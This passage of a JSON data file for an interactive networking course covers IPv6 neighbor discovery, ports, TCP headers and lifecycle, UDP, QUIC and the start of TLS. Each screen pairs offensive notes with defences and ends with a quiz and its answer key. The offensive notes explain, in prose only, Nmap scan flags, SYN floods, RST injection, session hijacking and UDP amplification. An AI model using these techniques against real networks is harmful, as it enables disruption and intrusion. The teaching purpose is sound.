          "explanation": "Leading zeros in 0db8 become db8. The contiguous run of five zero groups is replaced by '::', resulting in 2001:db8::1."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 56,
        "title": "IPv6 Neighbor Discovery & Autoconfiguration",
        "summary": "SLAAC, Router Advertisements, and Neighbor Discovery Protocol (NDP).",
        "concept": "IPv6 replaces ARP with the Neighbor Discovery Protocol (NDP) running over ICMPv6:\n- Neighbor Solicitation (NS) & Neighbor Advertisement (NA): Replaces ARP requests and replies using multicast.\n- Stateless Address Autoconfiguration (SLAAC):\n  1. Client sends Router Solicitation (RS) to all-routers multicast `ff02::2`.\n  2. Router replies with Router Advertisement (RA) containing the network prefix.\n  3. Client generates its own 64-bit interface ID (EUI-64 or privacy extension) and configures its address automatically without needing a DHCP server!",
        "cyberLens": {
          "offensive": "Rogue Router Advertisements (RA Flood): Attackers broadcast malicious RAs claiming to be the default IPv6 router. Windows clients automatically prioritize IPv6 over IPv4, redirecting all outbound traffic through the attacker.",
          "defensive": "Enable IPv6 RA Guard on enterprise switches to block unauthorized Router Advertisement messages on access ports."
        },
        "keyPoints": [
          "NDP runs on ICMPv6 and uses multicast instead of broadcast.",
          "SLAAC allows zero-configuration plug-and-play address generation.",
          "RA Guard is essential on Layer 2 switches to stop rogue IPv6 gateways."
        ],
        "quiz": {
          "question": "Which protocol replaces ARP in IPv6 networks for discovering the MAC address of a neighbor on the local link?",
          "options": [
            "BGP",
            "Neighbor Discovery Protocol (NDP) using ICMPv6",
            "DNSv6",
            "Reverse ARP (RARP)"
          ],
          "answer": 1,
          "explanation": "IPv6 completely eliminates ARP. Layer 2 address resolution is handled by Neighbor Discovery Protocol (NDP) using ICMPv6 Neighbor Solicitation and Advertisement messages."
        }
      }
    ]
  },
  {
    "id": "12",
    "module": "03 / ADDRESSING AND TRANSPORT",
    "title": "L4: ports, sockets & TCP",
    "desc": "Connect addresses to processes through ports, socket pairs, and TCP headers.",
    "screensCount": 6,
    "sourceRange": "SOURCE 57-62",
    "simulator": "tcp-header-dissector",
    "badge": "Transport Foundation",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 57,
        "title": "Port Numbers & Process Multiplexing",
        "summary": "How operating systems direct incoming packets to the correct application.",
        "concept": "An IP address identifies the device, but a Port Number (16-bit unsigned integer, 0 to 65535) identifies the specific software process running on that device:\n- Well-Known Ports (0 - 1023): Reserved for system services (HTTP: 80, HTTPS: 443, SSH: 22, DNS: 53, FTP: 21, SMTP: 25). Require root/admin privileges to bind.\n- Registered Ports (1024 - 49151): Assigned to specific applications (MySQL: 3306, RDP: 3389, PostgreSQL: 5432, Redis: 6379).\n- Dynamic / Ephemeral Ports (49152 - 65535): Client-side temporary ports randomly chosen by the OS kernel for outbound requests.",
        "cyberLens": {
          "offensive": "Port Scanning: Tools like Nmap probe all 65,535 ports to identify running services and unpatched software versions.",
          "defensive": "Attack Surface Reduction: Disable and close all non-essential listening ports. Block standard management ports (22, 3389) at edge firewalls."
        },
        "keyPoints": [
          "Ports allow a computer to run hundreds of network services simultaneously.",
          "Port 0 to 1023 require elevated administrative privileges.",
          "Outgoing connections use temporary ephemeral ports from the high range."
        ],
        "quiz": {
          "question": "Why do operating systems restrict binding to well-known ports (0-1023) to administrative (root) users?",
          "options": [
            "To save electricity.",
            "To prevent unprivileged malicious software or rogue users from hijacking standard services like SSH (22) or HTTP (80).",
            "Because well-known ports only work with fiber cables.",
            "Non-admin users cannot access the internet."
          ],
          "answer": 1,
          "explanation": "If non-root users could bind to port 80 or 22, any malicious script running in an unprivileged account could pose as the official web or SSH server and steal credentials."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 58,
        "title": "The 5-Tuple & Socket Pair",
        "summary": "The unique mathematical identity of every network connection in the universe.",
        "concept": "Every TCP/IP communication is uniquely identified across the world by a 5-Tuple:\n1. Source IP Address\n2. Source Port Number\n3. Destination IP Address\n4. Destination Port Number\n5. Transport Protocol (TCP or UDP)\nA Socket Pair consists of `(SrcIP:SrcPort, DstIP:DstPort)`. This explains how a web server on port 443 can serve 100,000 clients simultaneously without confusion: each client has a distinct IP or ephemeral port!",
        "cyberLens": {
          "offensive": "Connection Hijacking: If an attacker can guess or sniff the 5-tuple and the current TCP sequence number, they can inject malicious data or reset packets into an active connection.",
          "defensive": "Stateful firewalls and NAT devices index connections in their state tables directly using this 5-tuple."
        },
        "keyPoints": [
          "A connection is defined by its 5-tuple, not just destination port.",
          "Ephemeral ports prevent collisions between multiple tabs connecting to the same server.",
          "Inspect active 5-tuples using `netstat -an` or `ss -tuna`."
        ],
        "quiz": {
          "question": "How can a web server with one IP address and listening on one port (443) maintain simultaneous independent connections to 10,000 different browser clients?",
          "options": [
            "By assigning each client a different website.",
            "Because each connection is distinguished by a unique 5-tuple combination of client IP, client ephemeral port, server IP, server port, and protocol.",
            "The server responds to all clients at the exact same millisecond.",
            "Web browsers do not use ports."
          ],
          "answer": 1,
          "explanation": "Even though server IP, server port (443), and protocol (TCP) are identical, each client has a distinct IP address and/or a unique ephemeral source port, creating a distinct 5-tuple socket pair."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 59,
        "title": "The TCP Header Anatomy",
        "summary": "Ports, Sequence Numbers, Acknowledgment Numbers, Data Offset, Flags, and Window Size.",
        "concept": "The standard TCP header is 20 bytes (up to 60 with options):\n1. Source Port (16 bits) & Destination Port (16 bits).\n2. Sequence Number (32 bits): Byte offset of the first byte of payload data.\n3. Acknowledgment Number (32 bits): The next sequence number expected from sender.\n4. Data Offset (4 bits): TCP header length in 32-bit words (default 5 = 20 bytes).\n5. Reserved (3 bits).\n6. Control Flags (9 bits): URG, ACK, PSH, RST, SYN, FIN, ECE, CWR, NS.\n7. Window Size (16 bits): Flow control buffer capacity advertised by receiver.\n8. Checksum (16 bits): Verifies header, payload, and pseudo-header integrity.\n9. Urgent Pointer (16 bits): Points to urgent data when URG flag is set.",
        "cyberLens": {
          "offensive": "TCP Flag Scans: Attackers manipulate flag combinations to probe firewalls (SYN Scan, FIN Scan, NULL Scan, Xmas Scan).",
          "defensive": "Deep packet inspection drops invalid or contradictory flag combinations (e.g., SYN+FIN or packets with all flags set)."
        },
        "keyPoints": [
          "TCP guarantees ordered, byte-stream reliability through sequence numbers.",
          "Acknowledgment numbers are cumulative: they acknowledge all prior bytes.",
          "TCP header checksum protects against data corruption in transit."
        ],
        "quiz": {
          "question": "What does the Acknowledgment Number in a TCP segment header signify?",
          "options": [
            "The total number of packets sent so far.",
            "The exact next sequence number byte that the receiver expects to receive.",
            "The password for the server.",
            "The size of the router's hard drive."
          ],
          "answer": 1,
          "explanation": "TCP acknowledgment numbers indicate the next sequence byte the receiver expects, confirming receipt of all preceding sequence bytes in the stream."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 60,
        "title": "The TCP Control Flags Matrix",
        "summary": "SYN, ACK, FIN, RST, PSH, and URG: the control switches of the transport layer.",
        "concept": "- SYN (Synchronize): Initiates connection and synchronizes initial sequence numbers (ISN).\n- ACK (Acknowledgment): Confirms receipt of transmitted data.\n- FIN (Finish): Graceful connection termination (sender has no more data to send).\n- RST (Reset): Abruptly aborts connection due to error, closed port, or security reset.\n- PSH (Push): Tells the receiver to immediately pass data to application without buffering.\n- URG (Urgent): Indicates data pointed to by Urgent Pointer requires immediate processing.",
        "cyberLens": {
          "offensive": "RST Packet Injection: An attacker sniffing an unencrypted TCP session crafts a forged RST packet matching the active 5-tuple and sequence number, terminating legitimate connections instantly.",
          "defensive": "Firewalls generate TCP Resets to actively terminate unauthorized connection attempts."
        },
        "keyPoints": [
          "SYN starts; FIN politely closes; RST abruptly kills.",
          "Every packet after the initial SYN has the ACK flag enabled.",
          "PSH is common in interactive protocols like SSH and Telnet."
        ],
        "quiz": {
          "question": "When you attempt to connect to a closed TCP port on a remote server, what TCP flag does the remote server send back to reject the connection?",
          "options": [
            "FIN",
            "SYN",
            "RST (Reset)",
            "URG"
          ],
          "answer": 2,
          "explanation": "If a port is closed and not listening, the operating system kernel responds with a TCP packet having the RST (Reset) and ACK flags set to reject the handshake."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 61,
        "title": "Nmap Port Scanning Mechanics: SYN, Connect, & Stealth",
        "summary": "How port scanners determine whether a port is Open, Closed, or Filtered.",
        "concept": "1. TCP Connect Scan (`-sT`):\n   - Performs full 3-way handshake (SYN -> SYN-ACK -> ACK).\n   - Easy, unprivileged, but heavily logged in target application logs.\n2. SYN Stealth / Half-Open Scan (`-sS`):\n   - Sends SYN.\n   - If Open: Target replies SYN-ACK. Scanner immediately sends RST! Connection is never completed, avoiding application logging.\n   - If Closed: Target replies RST-ACK.\n   - If Filtered: No response or ICMP unreachable (firewall dropped packet).\n3. Inverse Scans (FIN `-sF`, NULL `-sN`, Xmas `-sX`):\n   - Sends non-SYN packets. According to RFC 793, closed ports must reply RST; open ports ignore the packet. Bypasses naive stateless firewalls.",
        "cyberLens": {
          "offensive": "SYN scanning is fast and stealthy because kernel connection tables never hand the session to user-space application logs.",
          "defensive": "Intrusion Detection Systems (Snort, Suricata, Zeek) detect SYN scans by tracking half-open connection spikes from a single source IP."
        },
        "keyPoints": [
          "SYN Scan is the industry standard default in Nmap.",
          "Open = SYN-ACK received; Closed = RST received; Filtered = Dropped by firewall.",
          "Modern stateful firewalls defeat FIN/NULL/Xmas scans by dropping out-of-state packets."
        ],
        "quiz": {
          "question": "Why is a TCP SYN scan (-sS) often called a 'Half-Open' scan?",
          "options": [
            "Because it only scans half the ports.",
            "Because the scanner never completes the 3-way handshake, sending an RST immediately upon receiving SYN-ACK.",
            "Because it runs in half-duplex mode.",
            "Because it only works on Windows."
          ],
          "answer": 1,
          "explanation": "Instead of completing the handshake with an ACK, the scanner sends an RST packet to tear down the connection before it becomes fully established."
        }
      },
      {
        "screenNumber": 6,
        "globalSource": 62,
        "title": "Flow Control & The Sliding Window",
        "summary": "Window Size, TCP Window Scaling, buffer exhaustion, and slow start.",
        "concept": "TCP ensures a fast sender does not overwhelm a slow receiver through Flow Control:\n- Advertised Window Size: The receiver informs the sender how many bytes of buffer space it currently has available.\n- Sliding Window: The sender can transmit up to the Window Size without waiting for an acknowledgment. As ACKs arrive, the window slides forward.\n- Zero Window: When the receiver buffer is full, it advertises Window = 0. The sender stops transmitting and periodically sends Window Probes until buffer clears.",
        "cyberLens": {
          "offensive": "Slowloris & Slow Read Attacks: Attackers slowly send data or advertise tiny window sizes (e.g. 1 byte) to tie up server worker threads and socket buffers indefinitely, exhausting server resources.",
          "defensive": "Web servers enforce minimum data transfer rate thresholds and socket timeouts to drop slow-reading clients."
        },
        "keyPoints": [
          "Flow control protects the receiver from being flooded by the sender.",
          "Congestion control protects the intermediate network routers from bufferbloat.",
          "Window Scaling (RFC 1323) allows window sizes up to 1 GB for high-bandwidth links."
        ],
        "quiz": {
          "question": "What happens when a receiver advertises a TCP Window Size of 0 to the sender?",
          "options": [
            "The connection is immediately terminated.",
            "The sender must halt data transmission until the receiver's buffer empties and a non-zero window is advertised.",
            "The sender doubles its transmission speed.",
            "The packet is rerouted through UDP."
          ],
          "answer": 1,
          "explanation": "A Zero Window indicates that the receiver's incoming socket buffer is completely full. The sender must stop sending data until buffer space becomes available."
        }
      }
    ]
  },
  {
    "id": "13",
    "module": "03 / ADDRESSING AND TRANSPORT",
    "title": "L4: the TCP lifecycle",
    "desc": "Step through opening, using, and closing a TCP connection.",
    "screensCount": 5,
    "sourceRange": "SOURCE 63-67",
    "simulator": "tcp-lifecycle-stepper",
    "badge": "State Machine",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 63,
        "title": "The 3-Way Handshake Step-by-Step",
        "summary": "SYN, SYN-ACK, ACK, and the negotiation of Initial Sequence Numbers (ISN).",
        "concept": "Before data transfer begins, client and server synchronize states:\n1. Step 1 (SYN): Client picks random Initial Sequence Number (ISN_c, e.g. 1000) and sends `[SYN] Seq=1000` (Client enters SYN_SENT).\n2. Step 2 (SYN-ACK): Server receives SYN, picks its own random ISN (ISN_s, e.g. 5000), acknowledges client sequence (`Ack=1001`), and sends `[SYN, ACK] Seq=5000, Ack=1001` (Server enters SYN_RCVD).\n3. Step 3 (ACK): Client acknowledges server sequence (`Ack=5001`), sending `[ACK] Seq=1001, Ack=5001` (Both enter ESTABLISHED).",
        "cyberLens": {
          "offensive": "Predictable ISN Attacks (Kevin Mitnick IP Spoofing): Historically, operating systems generated sequential or predictable ISNs. Attackers blinded to the server's reply could guess the Ack number and inject commands into trusted rsh/rlogin sessions.",
          "defensive": "Modern operating systems use cryptographically secure random number generators (CSPRNG) to randomize Initial Sequence Numbers."
        },
        "keyPoints": [
          "The handshake synchronizes starting sequence numbers in both directions.",
          "SYN consumes 1 sequence number byte.",
          "Both endpoints must reach the ESTABLISHED state before application data flows."
        ],
        "quiz": {
          "question": "If Client sends SYN with Seq=2000, what will be the ACK number in the Server's SYN-ACK reply?",
          "options": [
            "2000",
            "2001",
            "0",
            "1"
          ],
          "answer": 1,
          "explanation": "A SYN packet logically consumes one sequence number. The receiver acknowledges it by incrementing the sequence number by 1, resulting in Ack=2001."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 64,
        "title": "SYN Flood Denial of Service & SYN Cookies",
        "summary": "Exhausting the server backlog queue and the mathematical magic that solves it.",
        "concept": "The SYN Flood Vulnerability:\n1. Attacker sends thousands of SYN packets per second with spoofed source IPs.\n2. Server allocates memory for Transmission Control Block (TCB) in its SYN Backlog Queue and replies SYN-ACK.\n3. Since source IPs are fake, no ACK ever arrives.\n4. Server backlog queue fills to capacity; all legitimate new connection requests are rejected.\nDefensive Solution: SYN Cookies (RFC 4987):\n- The server DOES NOT allocate memory when receiving a SYN.\n- Instead, it encodes the connection state mathematically into the Initial Sequence Number (ISN = cryptographic hash of SrcIP, SrcPort, DstIP, DstPort, Secret Key).\n- When the client's final ACK arrives, the server recalculates the hash from `Ack - 1`. If valid, it allocates the connection!",
        "cyberLens": {
          "offensive": "SYN flooding is the most common transport-layer DDoS attack, capable of taking down unprotected web servers with modest bandwidth.",
          "defensive": "Enable SYN Cookies in Linux (`sysctl -w net.ipv4.tcp_syncookies=1`) and configure firewall SYN rate limiting."
        },
        "keyPoints": [
          "SYN floods exploit half-open connection memory allocation.",
          "SYN cookies make the server completely stateless until the 3-way handshake completes.",
          "Firewalls can proxy handshakes (TCP SYN Proxy) to absorb attacks."
        ],
        "quiz": {
          "question": "How do SYN Cookies protect a server from memory exhaustion during a SYN Flood attack?",
          "options": [
            "They store incoming passwords in a cookie file.",
            "They defer allocating server memory for the connection by encoding state cryptographically into the server's Initial Sequence Number.",
            "They automatically block all IP addresses ending in zero.",
            "They convert all TCP traffic into UDP."
          ],
          "answer": 1,
          "explanation": "SYN Cookies eliminate the SYN backlog queue entirely. The server allocates zero memory on receiving a SYN, verifying the connection state mathematically only when the client's ACK arrives."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 65,
        "title": "Data Transmission, ACKs, & Retransmission Timers",
        "summary": "Cumulative acknowledgments, Selective ACK (SACK), and fast retransmit.",
        "concept": "During data transfer:\n- Data is split into Maximum Segment Size (MSS, typically 1460 bytes).\n- Sender transmits segments; receiver sends ACKs confirming receipt.\n- Cumulative ACK: Acknowledges all bytes up to Ack number.\n- Selective Acknowledgment (SACK, RFC 2018): Receiver specifies exact discontinuous blocks received, avoiding retransmission of already-delivered packets.\n- Retransmission Timeout (RTO): If an ACK is not received before timer expires, sender retransmits segment.",
        "cyberLens": {
          "offensive": "Blind In-Window Data Injection: If an attacker can inject a forged packet whose sequence number falls anywhere inside the receiver's current sliding window, the receiver accepts and processes the malicious data.",
          "defensive": "Randomized ephemeral ports and randomized ISNs make guessing valid in-window sequence numbers statistically impossible."
        },
        "keyPoints": [
          "TCP guarantees zero data loss and ordered delivery.",
          "SACK dramatically improves throughput during high packet loss.",
          "Retransmission timers dynamically adapt based on measured Round Trip Time (RTT)."
        ],
        "quiz": {
          "question": "What is the primary benefit of the TCP Selective Acknowledgment (SACK) option?",
          "options": [
            "It encrypts passwords inside the TCP header.",
            "It allows the receiver to inform the sender exactly which non-contiguous blocks of data arrived, preventing unnecessary retransmission of already-received segments.",
            "It eliminates the need for sequence numbers.",
            "It speeds up DNS queries."
          ],
          "answer": 1,
          "explanation": "Without SACK, dropping one packet forces the sender to retransmit all subsequent packets. SACK specifies exact missing ranges so only lost segments are retransmitted."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 66,
        "title": "The 4-Way Teardown & TIME_WAIT State",
        "summary": "Graceful connection closure, half-closed sockets, and why TIME_WAIT lasts for 2 MSL.",
        "concept": "TCP teardown is a polite 4-step exchange:\n1. Client -> Server: `[FIN, ACK]` ('I have no more data to send'). Client enters FIN_WAIT_1.\n2. Server -> Client: `[ACK]` ('Acknowledged, but I may still have data for you'). Client enters FIN_WAIT_2; Server enters CLOSE_WAIT.\n3. Server -> Client: `[FIN, ACK]` ('Now I am also done sending'). Server enters LAST_ACK.\n4. Client -> Server: `[ACK]` ('Goodbye'). Server closes; Client enters TIME_WAIT.\nWhy TIME_WAIT exists:\n- Client waits for 2 Maximum Segment Lifetimes (2 MSL = typically 60-120 seconds).\n- Guarantees server receives final ACK (retransmits ACK if server resends FIN).\n- Ensures lingering delayed duplicate packets from old connection die in network before new connection can reuse the same port pair.",
        "cyberLens": {
          "offensive": "TIME_WAIT Port Exhaustion: Opening and closing thousands of outbound connections rapidly traps client ports in TIME_WAIT, causing 'cannot assign requested address' errors.",
          "defensive": "Enable `tcp_tw_reuse` in Linux kernels for high-traffic web proxies to safely reuse TIME_WAIT sockets."
        },
        "keyPoints": [
          "TCP closure is bidirectional: each side closes its send channel independently.",
          "CLOSE_WAIT on a server indicates the application forgot to call close().",
          "TIME_WAIT protects future connections from ghost packets."
        ],
        "quiz": {
          "question": "Why does a client endpoint remain in the TIME_WAIT state for 2 MSL (Maximum Segment Lifetime) after sending its final ACK?",
          "options": [
            "To download software updates.",
            "To ensure the final ACK reached the server and allow any wandering delayed duplicate packets to expire in the network before port reuse.",
            "Because the operating system crashed.",
            "To keep the Wi-Fi connection alive."
          ],
          "answer": 1,
          "explanation": "TIME_WAIT ensures that if the server missed the final ACK, it can resend its FIN and the client can re-acknowledge. It also prevents old delayed packets from colliding with a new connection using the same 5-tuple."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 67,
        "title": "TCP Reset Attacks & Session Hijacking",
        "summary": "Injecting spoofed RST packets and hijacking established telnet/SSH sessions.",
        "concept": "- TCP RST Attack: Sending a forged TCP packet with RST flag set matching the victim's active socket pair and current valid sequence window immediately destroys the connection.\n- The Great Firewall of China (GFW) famously uses out-of-band TCP RST injection to terminate connections containing forbidden keywords.\n- Session Hijacking: Attacker desynchronizes client and server (via packet drop or DoS) and injects commands with the correct sequence numbers directly into an established, authenticated terminal session.",
        "cyberLens": {
          "offensive": "Session hijacking turns an unencrypted telnet or HTTP administrative session into an instant root shell without knowing the user's password.",
          "defensive": "Cryptographic transport protocols (SSH, TLS) render TCP session hijacking harmless because injected plaintext fails cryptographic integrity verification (MAC/HMAC)."
        },
        "keyPoints": [
          "RST packets require no acknowledgment; they take effect immediately.",
          "RST attacks require knowledge of active sequence numbers.",
          "TLS and SSH completely eliminate the threat of plaintext session injection."
        ],
        "quiz": {
          "question": "Why is an unencrypted Telnet session vulnerable to TCP session hijacking, whereas an SSH session over the same network is immune?",
          "options": [
            "Telnet uses UDP, while SSH uses TCP.",
            "SSH uses cryptographic session keys and message authentication codes (MAC); any injected packets will fail cryptographic verification and be dropped.",
            "Telnet cannot be inspected by Wireshark.",
            "SSH does not use sequence numbers."
          ],
          "answer": 1,
          "explanation": "Even if an attacker injects TCP packets with correct sequence numbers into an SSH stream, the SSH protocol layer verifies an encrypted HMAC on every payload. Forged injected packets fail decryption and are discarded."
        }
      }
    ]
  },
  {
    "id": "14",
    "module": "03 / ADDRESSING AND TRANSPORT",
    "title": "L4: reliability & UDP",
    "desc": "Compare TCP reliability with UDP and see how state can become a target.",
    "screensCount": 5,
    "sourceRange": "SOURCE 68-72",
    "simulator": "tcp-vs-udp-race",
    "badge": "Speed & Reflection",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 68,
        "title": "The Ultra-Lean UDP Protocol",
        "summary": "8 bytes of pure minimalism: Source Port, Destination Port, Length, and Checksum.",
        "concept": "User Datagram Protocol (UDP, RFC 768) provides connectionless, best-effort datagram delivery with zero overhead:\n- Header size: Exactly 8 bytes (compared to TCP's minimum 20 bytes).\n- Header fields:\n  1. Source Port (16 bits)\n  2. Destination Port (16 bits)\n  3. Length (16 bits): Total length of UDP header + data in bytes (min 8).\n  4. Checksum (16 bits): Optional in IPv4, mandatory in IPv6.\n- No handshakes, no acknowledgments, no sequence numbers, no retransmissions, no flow control.",
        "cyberLens": {
          "offensive": "Spoofing Simplicity: Because UDP is connectionless and maintains zero state, the source IP in the IP header can be forged trivially without breaking any handshake.",
          "defensive": "Ingress filtering (BCP 38) at ISP borders drops outbound packets with source IPs outside the customer's allocated CIDR block."
        },
        "keyPoints": [
          "UDP header is fixed at 8 bytes.",
          "Applications that require speed over guaranteed delivery use UDP (VoIP, DNS, gaming, video streaming).",
          "If reliability is required, the application layer must implement it (e.g. QUIC)."
        ],
        "quiz": {
          "question": "What is the total fixed size of a standard UDP header?",
          "options": [
            "8 bytes",
            "20 bytes",
            "32 bytes",
            "64 bytes"
          ],
          "answer": 0,
          "explanation": "A UDP header contains only 4 fields of 2 bytes each (Source Port, Destination Port, Length, Checksum) for a total of exactly 8 bytes."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 69,
        "title": "TCP vs UDP: Comprehensive Architectural Face-Off",
        "summary": "Connection-oriented vs Connectionless, Byte-stream vs Datagram, Overhead vs Speed.",
        "concept": "| Feature | TCP | UDP |\n|---|---|---|\n| Connection State | Stateful (3-way handshake) | Stateless (connectionless) |\n| Reliability | Guaranteed delivery & ordering | Best-effort (packets may drop/reorder) |\n| Overhead | 20-60 byte header, ACK traffic | 8 byte header, zero ACK traffic |\n| Flow & Congestion | Built-in sliding window & AIMD | None (blasts as fast as app sends) |\n| Speed / Latency | Higher latency (handshake RTT) | Ultra-low latency (immediate send) |\n| Protocols | HTTP/1.1, HTTPS, SSH, FTP, BGP | DNS, DHCP, SNMP, NTP, VoIP, QUIC/HTTP3 |",
        "cyberLens": {
          "offensive": "State Exhaustion: TCP's statefulness makes it vulnerable to state-table exhaustion attacks (SYN floods). UDP's statelessness makes it vulnerable to amplification attacks.",
          "defensive": "Stateful firewalls must track UDP 'pseudo-sessions' by keeping a temporary translation timer for outbound UDP requests."
        },
        "keyPoints": [
          "Use TCP when data accuracy is critical (file download, bank transaction).",
          "Use UDP when real-time timeliness matters more than lost frames (voice call, live game).",
          "HTTP/3 moves the entire web to UDP via the QUIC protocol."
        ],
        "quiz": {
          "question": "Why is UDP preferred over TCP for real-time voice (VoIP) and online multiplayer video games?",
          "options": [
            "Because UDP encrypts audio automatically.",
            "Because waiting for TCP to retransmit a lost packet introduces audio lag/stutter that ruins a live real-time conversation; it is better to simply drop the old millisecond.",
            "Because TCP cables cannot carry voice signals.",
            "Because UDP uses fiber optics only."
          ],
          "answer": 1,
          "explanation": "In real-time communications, an audio packet that arrives 500ms late due to TCP retransmissions is useless and causes audio stutter. Discarding the lost packet and continuing live audio produces a far better experience."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 70,
        "title": "UDP Reflection & Amplification DDoS Attacks",
        "summary": "How attackers turn NTP, DNS, and Memcached servers into multi-terabit cyber weapons.",
        "concept": "Two ingredients enable massive UDP amplification attacks:\n1. IP Source Spoofing: Attacker sends UDP request with the spoofed IP address of the VICTIM.\n2. Amplification Factor: Attacker queries a server with a tiny request that triggers a massive response.\n- NTP Amplification (`monlist` command): 234-byte query -> 48,000-byte reply (~206x amplification!).\n- DNS Amplification (`ANY` query with EDNS0): 60-byte query -> 3,000-byte reply (~50x amplification).\n- Memcached Amplification: 15-byte query -> 750,000-byte reply (~50,000x amplification!).\nResult: 1 Gbps of attacker traffic becomes 50 Gbps to 500 Gbps pounding the victim's connection until it crashes.",
        "cyberLens": {
          "offensive": "Booter / Stresser services use pools of thousands of open UDP reflectors to launch multi-hundred gigabit volumetric DDoS attacks.",
          "defensive": "Response Rate Limiting (RRL) on DNS/NTP servers, disabling debug commands like `monlist`, and closing open Memcached ports to public Internet."
        },
        "keyPoints": [
          "Reflection requires connectionless protocols (UDP); cannot work on TCP.",
          "Amplification multiplies attacker bandwidth by up to 50,000 times.",
          "BCP 38 network egress filtering is the only global cure for IP spoofing."
        ],
        "quiz": {
          "question": "Why can an amplification DDoS attack NOT be performed using standard TCP connections?",
          "options": [
            "Because TCP packets are too small.",
            "Because TCP requires a 3-way handshake; if the attacker spoofs the victim's IP, the server's SYN-ACK goes to the victim, so the handshake never completes and no data payload is sent.",
            "Because TCP does not use ports.",
            "Because routers block all TCP packets."
          ],
          "answer": 1,
          "explanation": "TCP requires completing a handshake before data is transferred. If the sender's source IP is spoofed, the server's SYN-ACK reply goes to the spoofed IP, who drops it with an RST. The attacker cannot complete the handshake to trigger the response."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 71,
        "title": "BCP 38 & The Solution to IP Spoofing",
        "summary": "Best Current Practice 38: Ingress/Egress packet filtering at the internet edge.",
        "concept": "Published in May 2000, RFC 2827 / BCP 38 defines the definitive technical solution to spoofed DDoS attacks:\n- Rule: Every Internet Service Provider (ISP) and network operator must verify that any packet leaving a customer network has a source IP address belonging strictly to that customer's assigned address range.\n- Unicast Reverse Path Forwarding (uRPF):\n  - Strict Mode: Router looks up the source IP in its routing table. If the packet arrived on an interface different from the best reverse path to that IP, the packet is DROPPED.\nIf every ISP implemented BCP 38, IP spoofing and reflection DDoS would vanish worldwide overnight.",
        "cyberLens": {
          "offensive": "Attackers seek out bulletproof hosters and misconfigured regional ISPs that fail to implement BCP 38 to launch spoofed DDoS campaigns.",
          "defensive": "Deploying strict uRPF on all border router customer-facing interfaces blocks spoofed packets before they enter the Internet."
        },
        "keyPoints": [
          "BCP 38 drops packets with forged source IPs at the perimeter.",
          "uRPF automates BCP 38 enforcement via the routing table.",
          "Volumetric DDoS persists today solely due to non-compliant networks."
        ],
        "quiz": {
          "question": "What does a router using Strict Unicast Reverse Path Forwarding (uRPF) do when it receives an incoming packet?",
          "options": [
            "It reverses the payload letters.",
            "It checks if its routing table has a route back to the source IP on the EXACT SAME interface the packet arrived on; if not, it drops the packet.",
            "It converts the packet to IPv6.",
            "It forwards the packet to Google."
          ],
          "answer": 1,
          "explanation": "Strict uRPF looks up the packet's source IP. If the router would not use the receiving interface to route back to that source IP, the source IP is presumed spoofed and the packet is immediately discarded."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 72,
        "title": "QUIC: Re-Inventing Transport Over UDP",
        "summary": "How HTTP/3 and QUIC bring encryption, zero-RTT handshakes, and stream multiplexing to UDP.",
        "concept": "Traditional web transport stacks multiple layers: IP -> TCP -> TLS -> HTTP/2.\nProblems:\n1. High Latency: TCP handshake (1 RTT) + TLS handshake (1-2 RTT) = 200-300ms before first HTTP byte.\n2. Head-of-Line Blocking: If one TCP packet drops, all multiplexed HTTP streams wait.\nSolution: QUIC (RFC 9000 / HTTP/3):\n- Runs over UDP.\n- Integrates TLS 1.3 encryption directly into the transport layer.\n- 0-RTT Connection Resumption: Returning clients transmit encrypted data on the very first packet.\n- Eliminates Head-of-Line Blocking: Dropping a packet in Stream A has zero impact on Stream B.\n- Connection Migration: Switching from Wi-Fi to 5G does not disconnect your session (uses Connection ID, not IP).",
        "cyberLens": {
          "offensive": "Firewall Bypass: Early enterprise firewalls inspected TCP port 443 but ignored UDP port 443, allowing malware or data exfiltration over QUIC without inspection.",
          "defensive": "Security appliances must decrypt and inspect QUIC/UDP port 443 or block outbound UDP 443 to force browsers to fallback to standard TCP HTTPS."
        },
        "keyPoints": [
          "QUIC is the foundation of HTTP/3 and accounts for >30% of global web traffic.",
          "QUIC solves TCP head-of-line blocking and connection migration.",
          "QUIC encrypts transport headers, blinding traditional network monitors."
        ],
        "quiz": {
          "question": "What happens when your smartphone switches from office Wi-Fi to mobile 5G while downloading a large file over QUIC (HTTP/3)?",
          "options": [
            "The TCP connection breaks and the download restarts from 0%.",
            "The download continues seamlessly without interruption because QUIC tracks connections using a 64-bit Connection ID rather than the IP/Port socket pair.",
            "The phone shuts down.",
            "The file becomes corrupted."
          ],
          "answer": 1,
          "explanation": "Because traditional TCP binds to the 5-tuple (IP:port), changing IP drops the socket. QUIC uses unique Connection IDs independent of IP addresses, enabling seamless connection migration."
        }
      }
    ]
  },
  {
    "id": "15",
    "module": "04 / SESSIONS & APPLICATION",
    "title": "L5-L6: sessions & TLS",
    "desc": "Understand TLS identity, key agreement, and the limits of encrypted transport.",
    "screensCount": 5,
    "sourceRange": "SOURCE 73-77",
    "simulator": "tls-handshake-sim",
    "badge": "Encryption & Trust",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 73,
        "title": "The Cryptographic Triad: Confidentiality, Integrity, Identity",
        "summary": "Why transport layer security is required and what encryption does not hide.",
        "concept": "Transport Layer Security (TLS) sits between Transport (TCP) and Application (HTTP) to provide:\n1. Confidentiality: Symmetric encryption (AES-256-GCM, ChaCha20-Poly1305) ensures eavesdroppers cannot read payloads.\n2. Integrity: Cryptographic authentication tags (GMAC/Poly1305) guarantee packets cannot be modified in transit.\n3. Authentication & Identity: X.509 digital certificates verify the server is genuinely who it claims to be.\nCrucial Security Reality: TLS encrypts the PAYLOAD, but metadata remains visible: Source/Dest IP, Source/Dest Port, Packet Size, Timing, and Server Name Indication (SNI).",
        "cyberLens": {
